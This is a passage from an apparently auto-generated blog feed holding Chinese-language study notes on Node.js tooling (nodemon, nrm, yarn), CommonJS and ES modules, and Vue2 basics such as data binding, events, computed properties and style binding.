class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="nodemon"><a href="#nodemon" class="headerlink" title="nodemon"></a>nodemon</h2><ol>
<li><p>作用：</p>
<ul>
<li>每次修改服務器腳本文件都會重新啟動服務器</li>
</ul>
</li>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo npm install -g nodemon</span><br></pre></td></tr></table></figure>

</li>
<li><p>使用：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nodemon <span class="string">&#x27;file&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Nrm"><a href="#Nrm" class="headerlink" title="Nrm"></a>Nrm</h2><ol>
<li><p>簡介：</p>
<ul>
<li>NRM (npm registry manager) 是<code>npm</code>的鏡像源管理工具，可以加速在<code>npm</code>源間切換</li>
</ul>
</li>
<li><p>基本指令：</p>
<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">說明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>npm install -g nrm</code></td>
<td align="center">安裝<code>nrm</code></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>nrm ls</code></td>
<td align="center">查看可選源，其中帶有<code>*</code>的是當前使用的源</td>
</tr>
<tr>
<td align="center"><code>npm config get registry</code></td>
<td align="center">查看使用中的<code>nrm</code></td>
</tr>
<tr>
<td align="center"><code>npm config set registry &quot;url&quot;</code></td>
<td align="center">手動切換鏡像</td>
</tr>
<tr>
<td align="center"><code>nrm use &quot;xxx&quot;</code></td>
<td align="center">切換<code>nrm</code>：切換到xxx源</td>
</tr>
<tr>
<td align="center"><code>nrm test</code></td>
<td align="center">測試速度</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="Yarn"><a href="#Yarn" class="headerlink" title="Yarn"></a>Yarn</h2><ol>
<li><p>簡介：</p>
<ul>
<li>速度超快：Yarn 緩存了每個下載過的包，所以在此使用時無需重複下載。同時利用並行下載以最大化資源利用率，因此安裝速度更快</li>
<li>超級安全：在執行代碼前，Yarn 會通過算法校驗每個安裝包的完整性</li>
</ul>
</li>
<li><p>基本指令：</p>
<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">說明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>npm i -g yarn</code></td>
<td align="center">安裝<code>yarn</code></td>
</tr>
<tr>
<td align="center"><code>yarn init</code></td>
<td align="center">開始新項目，初始化紀錄文件</td>
</tr>
<tr>
<td align="center"><code>yarn install</code></td>
<td align="center">安裝項目的全部依賴</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>yarn add &quot;packageName&quot;</code></td>
<td align="center">添加依賴包</td>
</tr>
<tr>
<td align="center"><code>yarn add &quot;packageName&quot;@&#39;version&#39;</code></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>yarn add &quot;packageName&quot;--dev</code></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>yarn upgrade &quot;packageName&quot;@&#39;version&#39;</code></td>
<td align="center">升級依賴包</td>
</tr>
<tr>
<td align="center"><code>yarn remove &quot;packageName&quot;</code></td>
<td align="center">移除依賴包</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="CommonJS規範"><a href="#CommonJS規範" class="headerlink" title="CommonJS規範"></a>CommonJS規範</h2><ol>
<li><p>介紹：</p>
<ul>
<li>將公共的功能抽離成為一個單獨的<code>js</code>文件呢作為一個模塊化，默認情況下面這個模塊裡面的方法或屬性，外面是無法訪問的。</li>
<li>如果要讓外部可以訪問模塊裡面的方法或屬性，就必須在模塊裡通過<code>exports</code>或者<code>module.exports</code>暴露</li>
</ul>
</li>
<li><p>接口暴露：</p>
<ol>
<li><p>通過<code>exports</code>暴露：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    sayName     <span class="comment">// sayName:sayName</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通過<code>module.exports</code>暴露：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">say</span> = sayName</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>引入接口：</p>
<ul>
<li>使用<code>require</code>方法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> moudleFile = <span class="built_in">require</span>(<span class="string">&#x27;./path&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="模塊化編程"><a href="#模塊化編程" class="headerlink" title="模塊化編程"></a>模塊化編程</h2><ol>
<li><p>傳統JS代碼問題：</p>
<ol>
<li>命名空間：當引入多個擁有重名的函數，則後引入的 JS 文件會將其覆蓋</li>
<li>依賴關係：當一個 JS 要調用其他文件中的函數，則該文件需要在此文件前引入</li>
<li>暴露問題：JS 文件中的方法是全局方法，因此需要安裝其他插件去閉包保護</li>
</ol>
</li>
<li><p>模塊化編程：</p>
<ul>
<li>利用暴露接口和引入的方式解決傳統 JS 代碼問題</li>
</ul>
</li>
</ol>
<h3 id="ES模塊化開發"><a href="#ES模塊化開發" class="headerlink" title="ES模塊化開發"></a>ES模塊化開發</h3><ol>
<li><p>切換<code>commitJS</code>模塊化規範為<code>ES</code>的模塊化規範：</p>
<ol>
<li><p>創建日誌</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure>
</li>
<li><p>日誌中添加<code>type</code>屬性並修改為<code>module</code>：</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;module&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>暴露接口：</p>
<ol>
<li><p>通過<code>export default</code>暴露：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> moduleA</span><br></pre></td></tr></table></figure>
</li>
<li><p>通過<code>export</code>對象暴露：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    moduleA,</span><br><span class="line">    moduleB,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>引入接口：</p>
<ul>
<li>通過<code>import ... from</code>方法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> moduleA <span class="keyword">from</span> <span class="string">&#x27;./path&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; moduleA,moduleB &#125; <span class="keyword">from</span> <span class="string">&#x27;./path&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>注意：<font color="#f54747">一旦修改為使用<code>ES</code>模塊規範，則不能使用<code>commitJS</code>的模塊規範語句</font></p>
</li>
</ol>
]]></content>
      <categories>
        <category>NodeJS</category>
      </categories>
      <tags>
        <tag>NodeJS</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS - Vue2 Basic</title>
    <url>/myBlog/2022/06/08/2022/2022-6-8-Vue2JS-Basic/</url>
    <content><![CDATA[<h1 id="Vue2-Basic"><a href="#Vue2-Basic" class="headerlink" title="Vue2 Basic"></a>Vue2 Basic</h1><h2 id="Vue簡介"><a href="#Vue簡介" class="headerlink" title="Vue簡介"></a>Vue簡介</h2><ul>
<li><p>Vue是一套用於建構用戶介面的漸進式JavaScript框架（ie. 將數據變成用戶可視的界面）</p>
</li>
<li><p>Vue的特點：</p>
<ol>
<li>採用組件化模式，提高代碼複用率和更好維護<br> 在一個 .vue 裏面就是一個組件，包含 html&#x2F;css&#x2F;js</li>
<li>聲明式編碼，無需直接操作DOM，提高開發效率<br> 聲明式編碼 vs 命令式編碼<br> 命令式編碼：清楚列明每一個操作步驟<br> 聲明式編碼：用語法直接讓React佢操作DOM</li>
<li>使用虛擬DOM + 優秀的Diff算法，儘量複用DOM節點</li>
</ol>
</li>
</ul>
<h2 id="Vue操作"><a href="#Vue操作" class="headerlink" title="Vue操作"></a>Vue操作</h2><ul>
<li><p>Vue操作：</p>
<ol>
<li>想讓Vue工作，就必須創建一個Vue實例，且要傳入一個配置對象</li>
<li>root容器中的代碼依然符合html規範，只不過混入了一些特殊的Vue語法</li>
<li>root容器中的代碼被稱為 “Vue模板”</li>
<li>Vue實例和容器是<font color="#f54747">一對一</font>的</li>
<li>真實開發中有一個Vue實例，並且會配合著組件一起使用</li>
<li><code>&#123;&#123;xxx&#125;&#125;</code>中的<code>xxx</code>要寫JS表達式，且<code>xxx</code>可以自動讀取<code>data</code>中的所有屬性</li>
<li>一旦data中的數據發生改變，那麼頁面中用到該數據的地方也會自動更新</li>
</ol>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../vue_basic/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 準備一個容器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123;name&#125;&#125;, &#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 創建Vue實例</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#demo&#x27;</span>,      <span class="comment">// element 用於指定當前Vue實例為哪個容器服務，值通常為css選擇棄字符串</span></span><br><span class="line">    <span class="attr">data</span>:&#123; <span class="comment">// data中用於存儲數據，數據共el所指定的容器去使用，值暫時先寫成一個對象</span></span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">        <span class="attr">gender</span>: <span class="string">&#x27;M&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

</li>
<li><p>注意區分：<font color="#f54747">JS表達式</font> 和 <font color="#f54747">JS代碼&#x2F;語句</font></p>
<ul>
<li>JS表達式：一個表達式會生成一個值，可以放在任何一個地方<ol>
<li><code>a</code></li>
<li><code>a+b</code></li>
<li><code>demo(1)</code></li>
<li><code>x === y ? &#39;a&#39; : &#39;b&#39;</code></li>
</ol>
</li>
<li>JS語句：<ol>
<li><code>if()&#123;&#125;</code></li>
<li><code>for()&#123;&#125;</code></li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="模塊語法"><a href="#模塊語法" class="headerlink" title="模塊語法"></a>模塊語法</h2><ol>
<li><p>插值語法：<br> 功能：用於解析標籤體的內容<br> 寫法：<code>&#123;&#123;xxx&#125;&#125;</code>, <code>xxx</code>是JS表達式，且可以直接讀取到<code>data</code>中的所有屬性</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h3&gt;Hello, &#123;&#123;name&#125;&#125;&lt;/h3&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>指令語法：<br> 功能：用於解析標籤 (包括：標籤屬性、標籤體內容、綁定時間…)<br> 舉例：<code>v-bind:href=&quot;xxx&quot;</code> 或 簡寫為 <code>:href=&quot;xxx&quot;</code>, <code>xxx</code>同為JS表達式，且可以直接讀取到<code>data</code>中的所有屬性<br> 備註：Vue中有很多的指令，且形式都是: <code>v-yyy</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a v-bind:href=&quot;link.url&quot; x=&quot;hello&quot;&gt;Go To &#123;&#123;link.name&#125;&#125;&lt;/a&gt;</span><br><span class="line">&lt;a :href=&quot;link.url&quot; x=&quot;hello&quot;&gt;Go To &#123;&#123;link.name&#125;&#125; 2&lt;/a&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>Vue實例  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#demo&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">        <span class="attr">link</span>:&#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;Google&#x27;</span>,</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&#x27;http://www.google.com&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="數據綁定"><a href="#數據綁定" class="headerlink" title="數據綁定"></a>數據綁定</h2><ol>
<li><p>單向數據綁定(<code>v-bind</code>)：數據只能從<code>data</code>流向頁面</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 全寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;&gt;</span><br><span class="line">&lt;!-- 簡寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; :value=&quot;name&quot;&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>雙向數據綁定(<code>v-model</code>)：數據不僅能從data流向頁面，還可以從頁面留向<code>data</code></p>
<ul>
<li>雙向綁定一般都應用在表單類元素上 (如：<code>input</code>、<code>select</code>等)</li>
<li><code>v-model:value</code>可以簡寫為<code>v-model</code>，因為<code>v-model</code>默認收集的就是<code>value</code>值 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 全寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;&gt;</span><br><span class="line">&lt;!-- 簡寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="el和data寫法"><a href="#el和data寫法" class="headerlink" title="el和data寫法"></a>el和data寫法</h2><ol>
<li><p><code>el</code>的兩種寫法：</p>
<ol>
<li><code>new Vue</code>時配置<code>el</code>的屬性</li>
<li>先創建Vue實例，隨後再通過 <code>vm.$mount(&#39;#root&#39;)</code>指定<code>el</code>的值</li>
</ol>
</li>
<li><p><code>data</code>的兩種寫法：</p>
<ol>
<li><p>對象式</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">data</span>:&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>函數式<font color="#f54747">（推薦使用，因為後續會報錯）</font><br> 備註：由Vue管理的函數，<font color="#f54747">一定不要寫箭頭函數</font>，一旦寫了箭頭函數，<code>this</code>就不再是Vue實例了</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="MVVM模型"><a href="#MVVM模型" class="headerlink" title="MVVM模型"></a>MVVM模型</h2><ol>
<li><p>MVVM模型：</p>
 <img src="https://p.ipic.vip/5hwti8.jpg" width="600px"/>
 1. M：模型(Model)：對應data中的數據
 2. V：視圖(View)：模板
 3. VM：視圖模型(ViewModel)：Vue實例對象
     - 而在文檔中經常會使用 `vm`(ViewModel) 這個變量名來表示Vue實例

</li>
<li><p>觀察發現：</p>
<ol>
<li><code>data</code>中所有的屬性，最後都出現在<code>vm</code>身上</li>
<li><code>vm</code>身上的所有屬性 及 Vue原型上的所有屬性，在Vue模板中都可以直接使用</li>
</ol>
</li>
</ol>
<h2 id="數據代理"><a href="#數據代理" class="headerlink" title="數據代理"></a>數據代理</h2><ol>
<li><p><code>defineProperty</code>方法</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">value</span>:<span class="number">18</span>,</span><br><span class="line">    <span class="attr">enumerable</span>:<span class="literal">true</span>,       <span class="comment">// 控制屬性是否可以枚舉，默認值為false</span></span><br><span class="line">    <span class="attr">writable</span>:<span class="literal">true</span>,         <span class="comment">// 控制屬性是否可以被修改，默認值為false</span></span><br><span class="line">    <span class="attr">configurable</span>:<span class="literal">true</span>,     <span class="comment">// 控制屬性是否可以被刪除，默認值為false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 當有人讀取person的age屬性時，get函數(getter)就會被調用，且返回值就是age的值</span></span><br><span class="line">    <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> number</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 當有人修改person的age屬性時，set函數(setter)就會被調用，且會收到修改的具體值</span></span><br><span class="line">    <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        number = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>數據代理</p>
<ol>
<li><p>Vue中的數據代理：</p>
<ul>
<li>通過<code>vm</code>對象來代理<code>data</code>對象中屬性的操作(讀&#x2F;寫) (getter&#x2F;setter)</li>
</ul>
</li>
<li><p>Vue中的數據方法：</p>
<ul>
<li>更加方便的操作<code>data</code>中的數據</li>
</ul>
</li>
<li><p>基本原理：</p>
<ul>
<li>通過<code>Object.defineProperty()</code>方法把<code>data</code>對象中所有屬性添加到<code>vm</code>上</li>
<li>為每一個添加到vm的屬性，都指定一個<code>getter</code>和<code>setter</code></li>
<li>在<code>getter</code>&#x2F;<code>setter</code>內部去操作(讀&#x2F;寫)<code>data</code>中響應的屬性</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="事件處理"><a href="#事件處理" class="headerlink" title="事件處理"></a>事件處理</h2><h3 id="事件的基本使用"><a href="#事件的基本使用" class="headerlink" title="事件的基本使用"></a>事件的基本使用</h3><ol>
<li><p>使用<code>v-on:xxx</code>或<code>@xxx</code>綁定事件，其中<code>xxx</code>是事件名</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 不傳遞參數 --&gt;</span><br><span class="line">&lt;button @click=&quot;funct&quot;&gt;&lt;/button&gt;</span><br><span class="line">&lt;!-- 傳遞參數 --&gt;</span><br><span class="line">&lt;button @click=&quot;funct(parameters)&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>事件的回調需要配置在<code>methods</code>對象中，最終會在<code>vm</code>上</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">funct</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>methods</code>中配置的函數，<font color="#f54747">不要用箭頭函數</font>，否則this就不是vm了</p>
</li>
<li><p><code>methods</code>中配置的函數，都是被Vue所管理的函數，<code>this</code>的指向是<code>vm</code>或組件實例對象</p>
</li>
<li><p><code>@click=&quot;demo&quot;</code>和<code>@click=&quot;demo($event)&quot;</code>效果一致，但後者可以傳参</p>
</li>
</ol>
<h3 id="事件修飾符"><a href="#事件修飾符" class="headerlink" title="事件修飾符"></a>事件修飾符</h3><ol>
<li><code>prevent</code>：阻止默認事件</li>
<li><code>stop</code>：阻止事件冒泡</li>
<li><code>once</code>：事件只出發一次</li>
<li><code>capture</code>：使用事件的捕獲模式</li>
<li><code>self</code>：只有<code>event.target</code>是當前操作的元素時才觸法事件</li>
<li><code>passive</code>：事件的默認行為立即執行，無需等到事件回調執行完畢 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button @click.xxx=&quot;funct(parameters)&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
 備註：修飾符可以連續寫，例如<code>@click.prevent.stop</code>先阻止默認事件，再阻止冒泡</li>
</ol>
<h3 id="鍵盤事件"><a href="#鍵盤事件" class="headerlink" title="鍵盤事件"></a>鍵盤事件</h3><ol>
<li><p>Vue中常用的按鍵別名：<br> <code>enter</code>、<code>delete</code>、<code>esc</code>、<code>space</code>、<code>tab</code> (特殊，必須配合keydown去使用)、<code>up</code>、<code>down</code>、<code>left</code>、<code>right</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; @keyup.enter=&quot;funct&quot;&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>Vue未提供別名的按鍵，可以使用按鍵原始的key值去綁定，但注意要轉為<code>kebab-case</code>(短橫線命名)</p>
</li>
<li><p>系統修飾鍵（用法特殊）：<code>ctrl</code>、<code>alt</code>、<code>shift</code>、<code>meta</code></p>
<ul>
<li>配合<code>keyup</code>使用：按下修飾鍵的同時，再按下其他鍵，隨後釋放其他鍵，事件才會觸發</li>
<li>配合<code>keydown</code>使用：正常觸發事件  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; @keyup.ctrl.y=&quot;funct&quot;&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>也可以使用<code>keyCode</code>去指定具體的按鍵（不推薦）</p>
</li>
<li><p><code>Vue.config.keyCodes.自定義鍵名 = 鍵碼</code>，可以去定製按鍵別名</p>
</li>
</ol>
<h2 id="計算屬性"><a href="#計算屬性" class="headerlink" title="計算屬性"></a>計算屬性</h2><ol>
<li><p>定義：要用的屬性不存在，要通過「已有的屬性 (並非已有的隨便一個變量)」計算得來</p>
</li>
<li><p>原理：底層借助了<code>Object.defineProperty</code>方法提供的<code>getter</code>和<code>setter</code></p>
</li>
<li><p><code>get</code>函數的執行時間：</p>
<ul>
<li>初次讀取時會執行一次</li>
<li>當依賴的數據發生改變時會被再次調用</li>
</ul>
</li>
<li><p>優勢：與<code>methods</code>實現相比，內部有緩存機制(複用)，效率更高，調試方便</p>
</li>
<li><p>備註：</p>
<ol>
<li>計算屬性最終會出現在<code>vm</code>上，可直接讀取使用</li>
<li>如果計算屬性要被修改，那必須寫<code>set</code>函數去響應修改，且<code>set</code>中要引起計算時依賴的數據發生</li>
<li>如果只考慮讀取、不考慮改寫，可以使用簡寫方法，但因為是計算屬性不是<code>method</code>，因此不要加()</li>
</ol>
</li>
<li><p>具體代碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 完整寫法：</span></span><br><span class="line">    <span class="attr">fullName</span>:&#123;</span><br><span class="line">        <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>     <span class="comment">// 被調用的屬性即是依賴的屬性</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> arr = value.<span class="title function_">split</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">firstName</span> = arr[<span class="number">0</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">lastName</span> = arr[<span class="number">1</span>];</span><br><span class="line">        &#125;                    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 簡寫</span></span><br><span class="line">    <span class="title function_">fullName</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="綁定樣式"><a href="#綁定樣式" class="headerlink" title="綁定樣式"></a>綁定樣式</h2><h3 id="class樣式"><a href="#class樣式" class="headerlink" title="class樣式"></a>class樣式</h3><ul>
<li>語法：<code>:class=&quot;xxx&quot;</code>，<code>xxx</code>可以是字符串、數組和對象</li>
</ul>
<ol>
<li><p>字符串寫法</p>
<ul>
<li>適用於：類名不確定，要動態獲取  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定class樣式 -- 字符串寫法，適用於：樣式的類名不確定，需要動態決定 --&gt;</span><br><span class="line">&lt;div :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">mood</span>: <span class="string">&#x27;normal&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>數組寫法</p>
<ul>
<li>適用於：要綁定多個樣式，個數確定，名字也確定  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定class樣式 -- 數組寫法，適用於：要綁定的樣式個數不確定、名字也不確定 --&gt;</span><br><span class="line">&lt;div :class=&quot;classArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">classArr</span>:[<span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span>, <span class="string">&#x27;a3&#x27;</span>],</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>對象寫法</p>
<ul>
<li>適用於：要綁定多個樣式，個數不確定、名字也不確定  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定class樣式 -- 對象寫法，適用於：要昂丁的樣式個數確定、名字也確定，但要動態決定用不用 --&gt;</span><br><span class="line">&lt;div :class=&quot;classObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">classObj</span>:&#123; <span class="attr">a1</span>:<span class="literal">false</span>, <span class="attr">a2</span>:<span class="literal">false</span>, <span class="attr">a3</span>:<span class="literal">true</span> &#125;,</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="style樣式"><a href="#style樣式" class="headerlink" title="style樣式"></a>style樣式</h3><ol>
<li><p>對象寫法</p>
<ul>
<li>語法：<code>:style=&quot;&#123;fontSize: xxx&#125;&quot;</code> 其中<code>xxx</code>是動態值  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定style樣式 -- 對象寫法 --&gt;</span><br><span class="line">&lt;div :style=&quot;styleObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">styleObj</span>:&#123;</span><br><span class="line">    <span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span><br><span class="line">    <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">    <span class="attr">backgroundColor</span>: <span class="string">&#x27;orange&#x27;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>數組寫法</p>
<ul>
<li>語法：<code>:style=&quot;[a,b]&quot;</code> 其中a,b是樣式對象  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定style樣式 -- 數組寫法，不常用 --&gt;</span><br><span class="line">&lt;div :style=&quot;styleArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">styleArr</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">backgroundColor</span>: <span class="string">&#x27;orange&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="條件渲染"><a href="#條件渲染" class="headerlink" title="條件渲染"></a>條件渲染</h2><ol>
<li><p><code>v-if</code></p>
<ul>
<li>適用於：切換頻率比較低的場景</li>
<li>特點：<font color="#f54747">不展示的DOM元素會被直接移除</font></li>
<li>注意：<code>v-if</code>可以和<code>v-else-if</code>, <code>v-else</code>一起使用，但要求結構不能被「打斷」</li>
